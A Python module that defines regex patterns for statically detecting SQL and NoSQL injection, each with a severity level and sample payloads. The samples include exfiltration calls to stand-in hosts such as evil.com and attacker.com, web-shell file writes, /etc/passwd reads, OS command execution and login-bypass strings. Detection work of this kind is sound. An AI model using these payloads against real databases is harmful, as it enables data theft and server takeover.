"""SQL injection patterns for static detection.

This module contains comprehensive SQL injection patterns organized by attack type.
All patterns are compiled for performance and categorized by severity.
"""

import re
from dataclasses import dataclass
from enum import Enum
from typing import Pattern


class SQLInjectionType(Enum):
    """Categories of SQL injection attacks."""

    DESTRUCTIVE = "destructive"  # DROP, DELETE, TRUNCATE
    EXFILTRATION = "exfiltration"  # UNION, information_schema
    AUTHENTICATION_BYPASS = "authentication_bypass"  # OR 1=1, admin'--
    TIMING_ATTACK = "timing_attack"  # WAITFOR, SLEEP, BENCHMARK
    STACKED_QUERIES = "stacked_queries"  # ; followed by another query
    COMMENT_INJECTION = "comment_injection"  # --, /*, #
    ENCODING_BYPASS = "encoding_bypass"  # Hex, char(), unicode


class Severity(Enum):
    """Severity levels for SQL injection patterns."""

    CRITICAL = "critical"  # Immediate block, data loss possible
    HIGH = "high"  # Likely attack, block with logging
    MEDIUM = "medium"  # Suspicious, challenge user
    LOW = "low"  # Might be benign, log only


@dataclass
class SQLPattern:
    """SQL injection pattern definition.

    Attributes:
        name: Unique identifier for the pattern
        injection_type: Category of SQL injection
        severity: Risk level (CRITICAL, HIGH, MEDIUM, LOW)
        pattern: Compiled regex pattern
        description: Human-readable explanation
        examples: List of strings this pattern should match
        context_keywords: Keywords that should appear nearby (optional)
        false_positive_rate: Expected false positive rate (0.0-1.0)
    """

    name: str
    injection_type: SQLInjectionType
    severity: Severity
    pattern: Pattern[str]
    description: str
    examples: list[str]
    context_keywords: list[str] | None = None  # Keywords that should appear nearby
    false_positive_rate: float = 0.0  # Expected FP rate (0.0-1.0)


# ============================================================================
# DESTRUCTIVE SQL PATTERNS (CRITICAL)
# ============================================================================

DROP_TABLE = SQLPattern(
    name="drop_table",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bDROP\s+TABLE\b", re.IGNORECASE),
    description="DROP TABLE statement - permanent data loss",
    examples=[
        "DROP TABLE users",
        "drop table customers",
        "DROP  TABLE   orders",
    ],
)

DROP_DATABASE = SQLPattern(
    name="drop_database",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bDROP\s+DATABASE\b", re.IGNORECASE),
    description="DROP DATABASE statement - catastrophic data loss",
    examples=[
        "DROP DATABASE production",
        "drop database mydb",
    ],
)

TRUNCATE_TABLE = SQLPattern(
    name="truncate_table",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bTRUNCATE\s+TABLE\b", re.IGNORECASE),
    description="TRUNCATE TABLE - deletes all rows",
    examples=[
        "TRUNCATE TABLE users",
        "truncate table logs",
    ],
)

DELETE_WITHOUT_WHERE = SQLPattern(
    name="delete_without_where",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bDELETE\s+FROM\s+\w+\s*;?\s*$", re.IGNORECASE),
    description="DELETE without WHERE clause - deletes all rows",
    examples=[
        "DELETE FROM users",
        "delete from customers;",
    ],
)

# ============================================================================
# EXFILTRATION PATTERNS (HIGH)
# ============================================================================

UNION_SELECT = SQLPattern(
    name="union_select",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bUNION\s+(ALL\s+)?SELECT\b", re.IGNORECASE),
    description="UNION-based injection for data exfiltration",
    examples=[
        "UNION SELECT password FROM users",
        "union all select * from admin",
        "UNION  SELECT 1,2,3",
    ],
)

INFORMATION_SCHEMA = SQLPattern(
    name="information_schema",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bINFORMATION_SCHEMA\b", re.IGNORECASE),
    description="Access to database metadata",
    examples=[
        "SELECT * FROM information_schema.tables",
        "information_schema.columns",
    ],
)

LOAD_FILE = SQLPattern(
    name="load_file",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bLOAD_FILE\s*\(", re.IGNORECASE),
    description="MySQL LOAD_FILE - read server files",
    examples=[
        "LOAD_FILE('/etc/passwd')",
        "load_file('/var/www/config.php')",
    ],
)

INTO_OUTFILE = SQLPattern(
    name="into_outfile",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bINTO\s+(OUT|DUMP)FILE\b", re.IGNORECASE),
    description="MySQL INTO OUTFILE - write to server filesystem",
    examples=[
        "INTO OUTFILE '/tmp/data.txt'",
        "into dumpfile '/var/www/shell.php'",
    ],
)

# ============================================================================
# AUTHENTICATION BYPASS PATTERNS (HIGH)
# ============================================================================

OR_ONE_EQUALS_ONE = SQLPattern(
    name="or_1_equals_1",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bOR\s+['\"]?1['\"]?\s*=\s*['\"]?1['\"]?", re.IGNORECASE),
    description="Classic OR 1=1 authentication bypass",
    examples=[
        "OR 1=1",
        "or '1'='1'",
        "OR \"1\"=\"1\"",
    ],
)

OR_TRUE = SQLPattern(
    name="or_true",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bOR\s+['\"]?TRUE['\"]?", re.IGNORECASE),
    description="OR TRUE authentication bypass",
    examples=[
        "OR TRUE",
        "or 'true'",
    ],
)

ADMIN_COMMENT = SQLPattern(
    name="admin_comment",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.HIGH,
    pattern=re.compile(r"(admin|root)['\"]?\s*(--|#|/\*)", re.IGNORECASE),
    description="Admin username with comment to bypass password",
    examples=[
        "admin'--",
        "admin' #",
        "root'/*",
    ],
)

# ============================================================================
# TIMING ATTACK PATTERNS (MEDIUM)
# ============================================================================

WAITFOR_DELAY = SQLPattern(
    name="waitfor_delay",
    injection_type=SQLInjectionType.TIMING_ATTACK,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bWAITFOR\s+DELAY\b", re.IGNORECASE),
    description="SQL Server WAITFOR DELAY - timing attack",
    examples=[
        "WAITFOR DELAY '00:00:05'",
        "waitfor delay '0:0:10'",
    ],
)

SLEEP_FUNCTION = SQLPattern(
    name="sleep_function",
    injection_type=SQLInjectionType.TIMING_ATTACK,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bSLEEP\s*\(", re.IGNORECASE),
    description="MySQL SLEEP() function - timing attack",
    examples=[
        "SLEEP(5)",
        "sleep(10)",
    ],
)

BENCHMARK_FUNCTION = SQLPattern(
    name="benchmark_function",
    injection_type=SQLInjectionType.TIMING_ATTACK,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bBENCHMARK\s*\(", re.IGNORECASE),
    description="MySQL BENCHMARK() - timing attack",
    examples=[
        "BENCHMARK(1000000, MD5('test'))",
        "benchmark(5000000, SHA1(1))",
    ],
)

PG_SLEEP = SQLPattern(
    name="pg_sleep",
    injection_type=SQLInjectionType.TIMING_ATTACK,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bPG_SLEEP\s*\(", re.IGNORECASE),
    description="PostgreSQL pg_sleep() - timing attack",
    examples=[
        "pg_sleep(5)",
        "PG_SLEEP(10)",
    ],
)

# ============================================================================
# STACKED QUERIES (HIGH)
# ============================================================================

SEMICOLON_INJECTION = SQLPattern(
    name="semicolon_injection",
    injection_type=SQLInjectionType.STACKED_QUERIES,
    severity=Severity.HIGH,
    pattern=re.compile(r";\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE)", re.IGNORECASE),
    description="Stacked queries using semicolon separator",
    examples=[
        "; DROP TABLE users",
        "; SELECT * FROM admin",
        "; delete from logs",
    ],
)

# ============================================================================
# COMMENT INJECTION (MEDIUM)
# ============================================================================

SQL_COMMENT_DASH = SQLPattern(
    name="sql_comment_dash",
    injection_type=SQLInjectionType.COMMENT_INJECTION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"--\s*$", re.MULTILINE),
    description="SQL comment (--) to ignore rest of query",
    examples=[
        "admin' --",
        "1' or '1'='1' --",
    ],
)

SQL_COMMENT_HASH = SQLPattern(
    name="sql_comment_hash",
    injection_type=SQLInjectionType.COMMENT_INJECTION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"#.*$", re.MULTILINE),
    description="MySQL comment (#) to ignore rest of query",
    examples=[
        "admin' #",
        "1' or 1=1 #",
    ],
)

SQL_COMMENT_MULTILINE = SQLPattern(
    name="sql_comment_multiline",
    injection_type=SQLInjectionType.COMMENT_INJECTION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"/\*.*?\*/", re.DOTALL),
    description="Multi-line comment /* */ injection",
    examples=[
        "admin'/**/or/**/1=1",
        "/*bypass*/ DROP TABLE",
    ],
)

# ============================================================================
# ENCODING BYPASS (MEDIUM)
# ============================================================================

HEX_ENCODING = SQLPattern(
    name="hex_encoding",
    injection_type=SQLInjectionType.ENCODING_BYPASS,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\b0x[0-9a-f]{4,}\b", re.IGNORECASE),
    description="Hex-encoded strings to bypass filters",
    examples=[
        "0x61646d696e",  # 'admin' in hex
        "0x44524f50",  # 'DROP' in hex
    ],
)

CHAR_FUNCTION = SQLPattern(
    name="char_function",
    injection_type=SQLInjectionType.ENCODING_BYPASS,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bCHAR\s*\(\s*\d+", re.IGNORECASE),
    description="CHAR() function to obfuscate SQL keywords",
    examples=[
        "CHAR(65,68,77,73,78)",  # 'ADMIN'
        "char(115,101,108,101,99,116)",  # 'select'
    ],
)

UNICODE_ENCODING = SQLPattern(
    name="unicode_encoding",
    injection_type=SQLInjectionType.ENCODING_BYPASS,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"%u[0-9a-f]{4}", re.IGNORECASE),
    description="Unicode encoding bypass",
    examples=[
        "%u0053%u0045%u004C%u0045%u0043%u0054",  # 'SELECT'
    ],
)

# ============================================================================
# ADDITIONAL HIGH-RISK PATTERNS
# ============================================================================

XP_CMDSHELL = SQLPattern(
    name="xp_cmdshell",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bXP_CMDSHELL\b", re.IGNORECASE),
    description="SQL Server xp_cmdshell - execute OS commands",
    examples=[
        "xp_cmdshell 'dir'",
        "EXEC xp_cmdshell 'whoami'",
    ],
)

EXECUTE_IMMEDIATE = SQLPattern(
    name="execute_immediate",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bEXEC(UTE)?(\s+IMMEDIATE|\(@)", re.IGNORECASE),
    description="Dynamic SQL execution",
    examples=[
        "EXEC(@sql)",
        "EXECUTE IMMEDIATE 'DROP TABLE'",
    ],
)

# ============================================================================
# EXTENDED SQL PATTERNS
# ============================================================================

# PostgreSQL-Specific Patterns
PG_EXECUTE = SQLPattern(
    name="pg_execute",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bEXECUTE\s+FORMAT\b", re.IGNORECASE),
    description="PostgreSQL dynamic SQL execution via EXECUTE FORMAT",
    examples=["EXECUTE FORMAT('SELECT %I', column_name)", "EXECUTE FORMAT('DROP TABLE %I', tbl)"],
)

PG_COPY_TO = SQLPattern(
    name="pg_copy_to",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bCOPY\s+.*\s+TO\s+", re.IGNORECASE),
    description="PostgreSQL COPY TO - write to filesystem for exfiltration",
    examples=["COPY users TO '/tmp/users.csv'", "COPY (SELECT password FROM admin) TO '/var/www/data.txt'"],
)

PG_COPY_FROM_PROGRAM = SQLPattern(
    name="pg_copy_from_program",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bCOPY\s+.*\s+FROM\s+PROGRAM\b", re.IGNORECASE),
    description="PostgreSQL COPY FROM PROGRAM - execute OS commands",
    examples=["COPY temp FROM PROGRAM 'cat /etc/passwd'"],
)

PG_LO_IMPORT = SQLPattern(
    name="pg_lo_import",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\blo_import\b", re.IGNORECASE),
    description="PostgreSQL large object import - file system access",
    examples=["SELECT lo_import('/etc/passwd')"],
)

# Oracle-Specific Patterns
ORACLE_UTL_FILE = SQLPattern(
    name="oracle_utl_file",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bUTL_FILE\b", re.IGNORECASE),
    description="Oracle UTL_FILE package - file system read/write",
    examples=["UTL_FILE.PUT_LINE(file_handle, data)", "UTL_FILE.FOPEN('/tmp', 'output.txt', 'w')"],
)

ORACLE_DBMS_XMLGEN = SQLPattern(
    name="oracle_dbms_xmlgen",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bDBMS_XMLGEN\b", re.IGNORECASE),
    description="Oracle DBMS_XMLGEN - XML-based data extraction",
    examples=["DBMS_XMLGEN.getxml('SELECT * FROM users')"],
)

ORACLE_DBMS_OUTPUT = SQLPattern(
    name="oracle_dbms_output",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bDBMS_OUTPUT\b", re.IGNORECASE),
    description="Oracle DBMS_OUTPUT - debug output for data leakage",
    examples=["DBMS_OUTPUT.PUT_LINE(password)"],
)

ORACLE_UTL_HTTP = SQLPattern(
    name="oracle_utl_http",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bUTL_HTTP\b", re.IGNORECASE),
    description="Oracle UTL_HTTP - make HTTP requests for exfiltration",
    examples=["UTL_HTTP.REQUEST('http://evil.com?data='||password)"],
)

# Authentication Bypass - Advanced
OR_LIKE_WILDCARD = SQLPattern(
    name="or_like_wildcard",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bOR\s+\w+\s+LIKE\s+['\"]%['\"]", re.IGNORECASE),
    description="OR LIKE '%' authentication bypass (matches all)",
    examples=["OR username LIKE '%'", "OR email LIKE '%'--"],
)

HAVING_INJECTION = SQLPattern(
    name="having_injection",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bHAVING\s+\d+\s*=\s*\d+", re.IGNORECASE),
    description="HAVING clause injection for error-based extraction",
    examples=["HAVING 1=1", "GROUP BY user_id HAVING 1=1"],
)

ORDER_BY_INJECTION = SQLPattern(
    name="order_by_injection",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bORDER\s+BY\s+\d+", re.IGNORECASE),
    description="ORDER BY column number enumeration",
    examples=["ORDER BY 1", "ORDER BY 5--", "ORDER BY 100"],
)

# Boolean-Based Blind SQL Injection
AND_SUBSTRING = SQLPattern(
    name="and_substring",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bAND\s+(?:SUBSTRING|SUBSTR|MID)\s*\(", re.IGNORECASE),
    description="Boolean-based blind injection using SUBSTRING",
    examples=["AND SUBSTRING(password,1,1)='a'", "AND SUBSTR(api_key,5,1)='x'"],
)

IF_THEN_INJECTION = SQLPattern(
    name="if_then_injection",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bIF\s*\([^)]*,[^)]*,[^)]*\)", re.IGNORECASE),
    description="Conditional IF() for blind injection (MySQL)",
    examples=["IF(1=1,'true','false')", "IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)"],
)

CASE_WHEN_INJECTION = SQLPattern(
    name="case_when_injection",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bCASE\s+WHEN\s+.*\s+THEN\b", re.IGNORECASE),
    description="CASE WHEN conditional for data extraction",
    examples=["CASE WHEN (1=1) THEN 'a' ELSE 'b' END", "CASE WHEN SUBSTRING(password,1,1)='x' THEN 1 ELSE 0 END"],
)

# Second-Order/Stored Injection
INSERT_PAYLOAD = SQLPattern(
    name="insert_payload",
    injection_type=SQLInjectionType.STACKED_QUERIES,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bINSERT\s+INTO\s+\w+\s*\([^)]+\)\s*VALUES\s*\([^)]*(?:['\"].*--['\"]|['\"].*#['\"])", re.IGNORECASE),
    description="INSERT with embedded payload for second-order injection",
    examples=["INSERT INTO users (name) VALUES ('admin'--')", "INSERT INTO log (msg) VALUES ('test'); DROP TABLE users--')"],
)

UPDATE_PAYLOAD = SQLPattern(
    name="update_payload",
    injection_type=SQLInjectionType.STACKED_QUERIES,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bUPDATE\s+\w+\s+SET\s+.*(?:--|#|;)", re.IGNORECASE),
    description="UPDATE with embedded payload for second-order injection",
    examples=["UPDATE users SET name='admin'--' WHERE id=1"],
)

# NoSQL Injection (MongoDB, etc.)
NOSQL_OPERATOR = SQLPattern(
    name="nosql_operator",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.HIGH,
    pattern=re.compile(r"\$(?:ne|gt|lt|gte|lte|in|nin|or|and|not|where|regex|eq)", re.IGNORECASE),
    description="MongoDB operator injection",
    examples=["{'$ne': ''}", "{'$gt': ''}", "{'username': {'$ne': null}}"],
)

NOSQL_WHERE = SQLPattern(
    name="nosql_where",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\$where\s*:\s*['\"].*['\"]", re.IGNORECASE),
    description="MongoDB $where JavaScript injection",
    examples=["$where: 'this.password == this.password'", "$where: 'return true'"],
)

NOSQL_REGEX = SQLPattern(
    name="nosql_regex",
    injection_type=SQLInjectionType.AUTHENTICATION_BYPASS,
    severity=Severity.HIGH,
    pattern=re.compile(r"['\"]?\$regex['\"]?\s*:\s*['\"].*['\"]", re.IGNORECASE),
    description="MongoDB $regex injection for pattern matching",
    examples=["{'password': {'$regex': '.*'}}", "$regex: '^admin'"],
)

# Time-Based Blind Injection - Database-Specific
PG_SLEEP = SQLPattern(
    name="pg_sleep",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bpg_sleep\s*\(", re.IGNORECASE),
    description="PostgreSQL time-based blind injection",
    examples=["pg_sleep(5)", "SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END"],
)

ORACLE_SLEEP = SQLPattern(
    name="oracle_sleep",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.MEDIUM,
    pattern=re.compile(r"\bDBMS_LOCK\.SLEEP\s*\(", re.IGNORECASE),
    description="Oracle time-based blind injection",
    examples=["DBMS_LOCK.SLEEP(5)", "SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual"],
)

# Out-of-Band (OOB) Exfiltration
DNS_EXFILTRATION = SQLPattern(
    name="dns_exfiltration",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bLOAD_FILE\s*\(\s*['\"]\\\\\\\\", re.IGNORECASE),
    description="DNS exfiltration via UNC path (MySQL/MSSQL)",
    examples=["LOAD_FILE('\\\\\\\\attacker.com\\\\data')", "SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker.com')"],
)

HTTP_OOB = SQLPattern(
    name="http_oob",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bUTL_HTTP\.REQUEST\b|\bxp_dirtree\b|\bxp_cmdshell\b", re.IGNORECASE),
    description="HTTP out-of-band exfiltration",
    examples=["UTL_HTTP.REQUEST('http://attacker.com/'||password)", "xp_dirtree '\\\\attacker.com\\share'"],
)

# SQL Server Specific
MSSQL_XP_CMDSHELL = SQLPattern(
    name="mssql_xp_cmdshell",
    injection_type=SQLInjectionType.DESTRUCTIVE,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bxp_cmdshell\b", re.IGNORECASE),
    description="SQL Server xp_cmdshell - OS command execution",
    examples=["xp_cmdshell 'whoami'", "EXEC xp_cmdshell 'dir'"],
)

MSSQL_OPENROWSET = SQLPattern(
    name="mssql_openrowset",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bOPENROWSET\b", re.IGNORECASE),
    description="SQL Server OPENROWSET - query remote server",
    examples=["SELECT * FROM OPENROWSET('SQLNCLI','Server=evil.com')"],
)

# MySQL Specific
MYSQL_INTO_OUTFILE = SQLPattern(
    name="mysql_into_outfile",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.CRITICAL,
    pattern=re.compile(r"\bINTO\s+(?:OUT|DUMP)FILE\b", re.IGNORECASE),
    description="MySQL INTO OUTFILE - write to filesystem",
    examples=["SELECT * FROM users INTO OUTFILE '/var/www/html/shell.php'"],
)

MYSQL_LOAD_FILE = SQLPattern(
    name="mysql_load_file",
    injection_type=SQLInjectionType.EXFILTRATION,
    severity=Severity.HIGH,
    pattern=re.compile(r"\bLOAD_FILE\s*\(", re.IGNORECASE),
    description="MySQL LOAD_FILE - read files from filesystem",
    examples=["LOAD_FILE('/etc/passwd')", "UNION SELECT LOAD_FILE('/var/www/config.php')"],
)

# Compile all extended SQL patterns

# ============================================================================
# ALL SQL PATTERNS
# ============================================================================

ALL_SQL_PATTERNS: list[SQLPattern] = [
    # CRITICAL severity first (fast fail)
    DROP_TABLE,
    DROP_DATABASE,
    TRUNCATE_TABLE,
    DELETE_WITHOUT_WHERE,
    LOAD_FILE,
    INTO_OUTFILE,
    XP_CMDSHELL,
    # HIGH severity
    UNION_SELECT,
    INFORMATION_SCHEMA,
    OR_ONE_EQUALS_ONE,
    OR_TRUE,
    ADMIN_COMMENT,
    SEMICOLON_INJECTION,
    EXECUTE_IMMEDIATE,
    # MEDIUM severity
    WAITFOR_DELAY,
    SLEEP_FUNCTION,
    BENCHMARK_FUNCTION,
    PG_SLEEP,
    SQL_COMMENT_DASH,
    SQL_COMMENT_HASH,
    SQL_COMMENT_MULTILINE,
    HEX_ENCODING,
    CHAR_FUNCTION,
    UNICODE_ENCODING,
    # Extended patterns
    PG_EXECUTE,
    PG_COPY_TO,
    PG_COPY_FROM_PROGRAM,
    PG_LO_IMPORT,
    ORACLE_UTL_FILE,
    ORACLE_DBMS_XMLGEN,
    ORACLE_DBMS_OUTPUT,
    ORACLE_UTL_HTTP,
    OR_LIKE_WILDCARD,
    HAVING_INJECTION,
    ORDER_BY_INJECTION,
    AND_SUBSTRING,
    IF_THEN_INJECTION,
    CASE_WHEN_INJECTION,
    INSERT_PAYLOAD,
    UPDATE_PAYLOAD,
    NOSQL_OPERATOR,
    NOSQL_WHERE,
    NOSQL_REGEX,
    PG_SLEEP,
    ORACLE_SLEEP,
    DNS_EXFILTRATION,
    HTTP_OOB,
    MSSQL_XP_CMDSHELL,
    MSSQL_OPENROWSET,
    MYSQL_INTO_OUTFILE,
    MYSQL_LOAD_FILE,
]


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================


def get_patterns_by_severity(severity: Severity) -> list[SQLPattern]:
    """Get all SQL patterns of a specific severity.

    Args:
        severity: The severity level to filter by

    Returns:
        List of patterns matching the severity
    """
    return [p for p in ALL_SQL_PATTERNS if p.severity == severity]


def get_patterns_by_type(injection_type: SQLInjectionType) -> list[SQLPattern]:
    """Get all SQL patterns of a specific injection type.

    Args:
        injection_type: The injection type to filter by

    Returns:
        List of patterns matching the injection type
    """
    return [p for p in ALL_SQL_PATTERNS if p.injection_type == injection_type]


def detect_sql_injection(text: str) -> list[dict[str, str]]:
    """Detect SQL injection patterns in text.

    Args:
        text: The text to scan for SQL injection

    Returns:
        List of detected patterns with details

    Example:
        >>> results = detect_sql_injection("admin' OR 1=1--")
        >>> results[0]["name"]
        'or_1_equals_1'
    """
    findings = []

    for pattern in ALL_SQL_PATTERNS:
        if pattern.pattern.search(text):
            findings.append(
                {
                    "name": pattern.name,
                    "injection_type": pattern.injection_type.value,
                    "severity": pattern.severity.value,
                    "description": pattern.description,
                }
            )

    return findings
